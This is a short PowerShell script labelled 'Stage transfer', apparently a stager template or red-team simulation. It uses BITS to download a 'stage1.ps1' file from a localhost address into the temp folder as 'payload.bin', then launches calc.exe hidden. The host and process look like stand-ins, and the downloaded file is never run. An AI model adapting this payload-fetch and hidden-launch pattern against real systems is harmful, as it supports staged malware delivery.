<# Stage transfer #>
[CmdletBinding()]
param(
    [string]$TransferUrl = "http://127.0.0.1/stage1.ps1",
    [string]$Stage2Path = "$env:TEMP\payload.bin",
    [int]$StageTimeout = 28
)
Start-BitsTransfer -Source $TransferUrl -Destination $Stage2Path
Start-Process -FilePath "calc.exe" -WindowStyle Hidden
Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
